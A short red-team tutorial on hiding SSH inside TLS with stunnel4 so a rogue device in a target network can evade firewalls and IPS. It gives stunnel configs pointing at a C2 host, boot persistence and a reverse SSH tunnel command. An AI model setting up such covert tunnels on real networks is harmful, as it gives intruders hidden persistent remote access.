[EN] SSH Tunneling/TLS Tunneling

The purpose of this procedure is to detail the steps to encapsulate SSH traffic through a TLS tunnel in order to bypass IPS and firewalls.

Context

In a case of Red-Team intrusion, you may have a rogue device plugged in the audited company’s network. But SSH traffic can suspect, so we will encapsulate it in TLS traffic.

Packages

First of all, we need to install stunnel4 in order to set up the TLS tunnel.

# Client (rogue device)
sudo apt install stunnel4

#Server (C2)
sudo apt install stunnel4

Certificate generation

In order to encrypt traffic, stunnel4 need a certificate. A lot of tools allow you to create one, we will see here how to create one using openssl.

sudo openssl req -new -x509 -days 365 -nodes -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem

TLS Tunneling

Once stunnel4 is installed and the certificate created, we can set up our TLS tunnel.

To do so, we will create a file on the server :

# Server
cat >> /etc/stunnel/stunnel.conf << EOF
client = no
[reverse-ssh]
cert = /etc/stunnel/stunnel.pem
accept = 443
connect = 22
EOF

This configuration means that every connexions received on port 443 will be sent to the port 22.

Once the server configuration file is created, we will do the same on the client :

# Client
cat >> /etc/stunnel/stunnel.conf << EOF
client = yes
[reverse-ssh]
accept = 127.0.0.1:2222
connect = SERVER_IP:443
EOF

This configuration means that every connexions received on port 2222 will be sent to port 443 on the server, which is the listening port of the TLS tunnel.

Once the configurations done on both side, we can start the stunnel4 service and enable it so it can start at every boot :

# Client and server
sudo systemctl start stunnel4
sudo systemctl enable stunnel4

SSH Tunneling

Now our TLS tunnel is created and functional, we will set up the SSH tunnel so it’s encapsulated into the TLS tunnel.

To do so, we will initiate the SSH connexion on the client by typing this command :

# Client
ssh -R 2224:127.0.0.1:22 -p 2222 server_user@127.0.0.1 -N -v -f
         ^
Can be whatever you want (just an unused port)

This command will set the port 2224 in listening state on the server and redirect all the traffic coming into this port to the port 22 on the client. And by telling to initiate the connexion on the port 2222 (which is the listening port of the TLS tunnel on the client) it will send the request through the TLS tunnel.

You can now connect to the client from the server using this command :

# Server
ssh client_user@127.0.0.1 -p 2224
